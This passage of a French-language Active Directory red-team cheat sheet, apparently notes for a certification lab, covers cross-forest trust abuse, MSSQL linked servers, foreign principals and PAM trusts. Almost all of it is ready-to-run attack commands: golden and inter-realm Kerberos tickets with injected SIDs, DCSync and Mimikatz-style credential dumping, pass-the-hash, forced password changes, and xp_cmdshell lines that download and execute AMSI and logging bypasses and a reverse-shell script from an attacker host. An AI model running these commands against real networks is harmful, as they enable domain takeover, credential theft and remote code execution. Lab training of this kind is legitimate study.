C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:<hash> /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt" "exit"
klist
winrs -r:domain-dc cmd
```

## Abuse Trust Relationship (Forest)

Énumération et illustration des mécanismes d'authentification inter-forêts.

### Forest Trust - Kerberos Context

Regroupe un exemple de ticket Kerberos et une requête de réplication.

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /aes256:<hash> /ptt"
lsadump::dcsync /user:domain\user$ /domain:domain.local
```

### Forest Trust - Tool Transfer

Copie des exécutables vers un contrôleur de domaine distant.

```powershell
echo F | xcopy C:\AD\Tools\BetterSafetyKatz.exe \\dc.domain.local\C$\Users\Public\BetterSafetyKatz.exe /Y
echo F | xcopy C:\AD\Tools\Rubeus.exe \\dc.domain.local\C$\Users\Public\Rubeus.exe /Y
```

### Forest Trust - Inter-Realm Ticket

Présente un ticket inter-realm associé à une relation de confiance inter-forêts.

```powershell
winrs -r:dc.domain.local cmd
C:\Users\Public\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /rc4:<hash> /service:krbtgt /target:domain.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\Users\Public\sharedwithdomain.kirbi" "exit"
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\sharedwithdomain.kirbi /service:CIFS/dc.domain.local /dc:dc.domain.local /ptt
```

### CIFS - Remote Share

Vérifie l'accès à un partage CIFS dans la forêt distante.

```powershell
dir \\dc.domain.local\eushare
```

### Forest Trust - Remote Environment

Copie et lance les composants d'un environnement PowerShell distant.

```powershell
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\dc.domain.local\C$\Users\Public\InShellProf.dll /Y
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\dc.domain.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
winrs -r:dc.domain.local cmd
C:\Users\Public\RunWithRegistryNonAdmin.bat
```

### Forest Trust - Group SIDs

Recherche des groupes dont les identifiants SID répondent au filtre défini.

```powershell
Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"' -Server domain.local
```

### Forest Trust - SID History Ticket

Illustre la construction d'un ticket inter-realm avec des SID supplémentaires.

```powershell
C:\Users\Public\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:<hash> /service:krbtgt /target:domain.local /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /ticket:C:\Users\Public\domainnet.kirbi" "exit"
```

### Forest Trust - HTTP TGS

Demande un ticket de service HTTP et vérifie l'accès distant.

```powershell
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\domainnet.kirbi /service:HTTP/domain-net.domain.local /dc:dc.domain.local /ptt
winrs -r:domain-net.domain.local cmd
whoami /groups
```

## MSSQL

Requêtes d'énumération SQL Server, linked servers et paramètres d'exécution.

### PowerUpSQL - Linked Servers

Recense les instances SQL Server, leurs liens et le contexte de certaines requêtes.

```powershell
Import-Module .\PowerupSQL-master\PowerupSQL.psd1
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
Get-SQLServerLink -Instance us-mssql.domain.local -Verbose
Get-SQLServerLinkCrawl -Instance us-mssql -Verbose
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
```

### Powercat - Listener

Démarre un listener et présente une commande distante liée à SQL Server.

```powershell
. .\powercat.ps1
powercat -l -v -p 443 -t 1000
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/Invoke-PowerShellTcpEx.ps1)"'''
```

### SQL Server - RPC Out et xp_cmdshell

Modifie des paramètres de serveur lié et de fonctionnalité SQL Server.

```powershell
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"
Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""db-sqlsrv"""
Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""db-sqlsrv"""
```

### SQL Server - Linked Query

Relance une requête via un linked server pour examiner son résultat.

```powershell
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
```

### SQL Server - Remote Command

Présente une requête SQL qui déclenche une commande PowerShell à distance.

```powershell
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.x/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.x/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv
```

## Foreign Security Principals (FSPs)

Identification des Foreign Security Principals, groupes et ACL inter-domaines.

### FSP - PowerView

Charge PowerView et prépare l'énumération des relations entre forêts.

```powershell
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.x/PowerView.ps1')
Note: Make sure to bypass AMSI before executing powershell commands
Get-ForestTrust
```

### Forest ACLs

Recherche les ACL significatives dans un domaine d'une autre forêt.

```powershell
Find-InterestingDomainAcl -ResolveGUIDs -Domain dbvendor.local
```

### Forest ACL - Password Change

Illustre l'effet d'un droit d'écriture sur le mot de passe d'un compte.

```powershell
Set-DomainUserPassword -Identity dbxsvc -AccountPassword (ConvertTo-SecureString 'Password@123' -AsPlainText -Force) -Domain dbvendor.local –Verbose
```

### Foreign Groups

Recherche les groupes contenant des principaux de sécurité externes.

```powershell
Find-ForeignGroup –Verbose
```

### Foreign SID Lookup

Identifie un utilisateur de domaine à partir de son SID.

```powershell
Get-DomainUser -Domain dbvendor.local | ?{$_.ObjectSid -eq 'S-1-5-21-569087967-1859921580-1949641513-4101'}
```

### Foreign Account - WinRS

Teste une connexion WinRS avec des identifiants de domaine.

```powershell
winrs -r:db-dc.db.local -u:dbvendor\dbxsvc -p:Password@123 "whoami"
```

### Foreign Account - Remoting

Crée un objet PSCredential puis ouvre une session PowerShell distante.

```powershell
$passwd = ConvertTo-SecureString 'Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("dbvendor\dbxsvc", $passwd)
$dbdc = New-PSSession -Computername db-dc.db.local -Credential $creds
Invoke-Command -scriptblock{whoami;hostname} -Session $dbdc
```

## PAM Trust

Analyse des PAM Trusts, Shadow Principals et connexions entre forêts.

### PAM Trust - Foreign Principals

Énumère les objets Foreign Security Principal du domaine désigné.

```powershell
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server domain.local
```

### PAM Trust - Group Membership

Identifie les groupes contenant un principal défini par son SID.

```powershell
Get-ADGroup -Filter * -Properties Member -Server domain.local | ?{$_.Member -match 'S-1-5-21-2781415573-3701854478-2406986946-500'}
```

### PAM Trust - DA Context

Prépare une session d'administration du domaine et les outils associés.

```powershell
C:\AD\Tools\Rubeus.exe asktgt /domain:<domain> /user:administrator /aes256:<hash> /dc:<dc> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\dc.domain.local\C$\Users\Public\InShellProf.dll /Y
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\dc.domain.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
winrs -r:dc.domain.local cmd
C:\Users\Public\RunWithRegistryNonAdmin.bat
```

### PAM Trust - Discovery

Filtre les relations de confiance selon leurs attributs ForestTransitive et SIDFiltering.

```powershell
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
```

### PAM Trust - Replication

Présente des exemples d'accès à des données répliquées entre domaines.

```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:domain\Administrator /domain:domain.local" "exit"
C:\AD\Tools\Rubeus.exe asktgt /domain:domain.local /user:administrator /aes256:<hash> /dc:<dc> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\dc.domain.local\C$\Users\Public\InShellProf.dll /Y
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\dc.domain.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
winrs -r:dc.domain.local cmd
C:\Users\Public\RunWithRegistryNonAdmin.bat
```

### PAM Trust - Other Forests

Interroge les relations de confiance depuis une autre forêt.

```powershell
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} -Server production.local
```

### Shadow Security Principals

Affiche les membres et les SID des objets Shadow Principal.

```powershell
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name, member, msDS-ShadowPrincipalSid | fl
```

### Forest DNS

Consulte les informations d'une zone DNS associée à une forêt.

```powershell
Get-DnsServerZone -ZoneName production.local |fl *
```

### WSMan - TrustedHosts

Modifie la liste TrustedHosts du client WSMan, ce qui élargit les hôtes acceptés.

```powershell
Note: Run from an elevated shell
Set-Item WSMan:\localhost\Client\TrustedHosts * -Force
```

### PAM Trust - PowerShell Remoting

Présente une connexion distante utilisant un contexte d'authentification négocié.

```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:administrator /domain:domain.local /ntlm:<hash> /run:powershell.exe" "exit"
Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
```

## Mindmaps

Schémas récapitulatifs pour Active Directory, les ACL et les outils associés.

### AD Mindmap

![AD Mindmap](/assets/images/posts/crte/6.png)

### AD Recommendations

![AD Recommendations](/assets/images/posts/crte/7.png)

### DACL

![DACL](/assets/images/posts/crte/8.png)

### Bypass AV

![Bypass AV](/assets/images/posts/crte/9.png)

### BloodHound Collector

![BloodHound Collector](/assets/images/posts/crte/10.png)

